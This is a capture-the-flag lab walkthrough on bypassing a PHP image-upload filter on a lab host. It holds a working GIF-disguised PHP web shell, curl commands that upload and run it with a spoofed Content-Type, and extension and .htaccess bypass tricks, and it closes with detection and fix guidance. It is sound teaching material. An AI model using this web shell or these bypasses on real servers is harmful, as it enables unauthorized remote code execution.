# C09 · Station B — Upload filter bypass · ★★☆☆

> **Chapter:** [[Chapter-09-Overview]] · **Next:** [[C09-Station-C-Command-Injection]]
> **Host:** `hollow-portal-01` (`target-web`) · **Target:** `/share.php` → `/shares/`
> **The bug:** the "images only" uploader blocks a deny-list of extensions and checks `Content-Type` — both are attacker-controlled, and Apache runs more than `.php`.

The hardened uploader that isn't. Three weak checks stacked, each bypassed by the gap the one before it left.

---

## 1. Exploit — do this first

```bash
# GIF89a magic bytes (passes content sniffing) + .pht (not on the deny-list,
# but Apache still runs it as PHP) + spoofed image Content-Type.
attacker$ printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.pht
attacker$ curl -F "image=@shell.pht;type=image/gif" http://target-web/share.php
attacker$ curl 'http://target-web/shares/shell.pht?c=cat+/var/www/flag.txt'
GIF89a;
R2R{w3b_rce_is_your_front_d00r}
```

| Token | What it does |
|---|---|
| `GIF89a;` | a GIF magic-byte header, so the file looks like an image |
| `.pht` | a PHP-capable extension **not** on the deny-list (`php phtml php4 php3 phps`) |
| `;type=image/gif` | curl sets the part's `Content-Type`; passes the image check |
| `/shares/shell.pht` | Apache's `AddHandler` runs `.pht` as PHP; the `GIF89a;` just prints |

---

## 2. How you find it

```bash
attacker$ curl -F "image=@shell.php;type=image/gif" http://target-web/share.php | grep -i blocked
  Blocked: .php files are not allowed.
attacker$ curl -F "image=@x.txt;type=text/plain"    http://target-web/share.php | grep -i blocked
  Blocked: images only (got Content-Type: text/plain).
```

Two checks revealed: an extension deny-list and a `Content-Type` allow-list. Probe the deny-list (`.pht`, `.php5`, `x.php.jpg` all slip through) and remember the `Content-Type` is yours to set.

---

## 3. Why it works

- **Deny-lists leak.** Blocking `php phtml php4 php3 phps` misses `.pht` and `.php5`, and only checks the *last* extension — so `x.php.jpg` passes too.
- **Apache runs more than `.php`.** `config/hollow-share.conf` sets `AddHandler application/x-httpd-php .php .phtml .php5 .pht .phar`; `mod_mime` treats **any** dot-component as an extension, so `x.php.jpg` executes as well.
- **The `Content-Type` is attacker-controlled** — a multipart part header, not a fact about the file. `image/gif` on a PHP file sails through.
- **`AllowOverride All`** on `/shares` means an uploaded `.htaccess` (`AddType application/x-httpd-php .jpg`) can make plain `.jpg` run as PHP.

---

## 4. Pitfalls

- **A plain `.pht` with no image header** can still pass here (no magic-byte check), but the `GIF89a;` habit defeats real content sniffers — build it in.
- **`.php` and `.phtml` are blocked** — don't waste time on them; reach for `.pht`/`.php5`/double-extension.
- **`system()` is dash** — wrap reverse shells in `bash -c`, as in [[C09-Station-A-Unrestricted-Upload]].

---

## 5. Detect & fix

- **Detect:** scan upload dirs for PHP regardless of extension (`grep -rl '<?php' /var/www/html/shares`); any uploaded `.htaccess` is an incident. Recipes in [[Blue-Team-Playbook]].
- **Fix:** allow-list `jpg/png/gif`, **re-encode** the image server-side (strips the payload), store with a server-chosen random name; `AllowOverride None`, drop the `AddHandler`, serve uploads from outside the docroot. More in [[Blue-Team-Playbook]].

---

## 6. What you learned

- A deny-list is a list of the attacks the author thought of. Allow-list instead, and re-encode.
- The server's handler config decides what "executable" means — `.php` is not the only PHP extension.
- Next, RCE with no upload at all: [[C09-Station-C-Command-Injection]].

> Next: [[C09-Station-C-Command-Injection]] · Related: [[C09-Station-A-Unrestricted-Upload]] · [[Blue-Team-Playbook]]
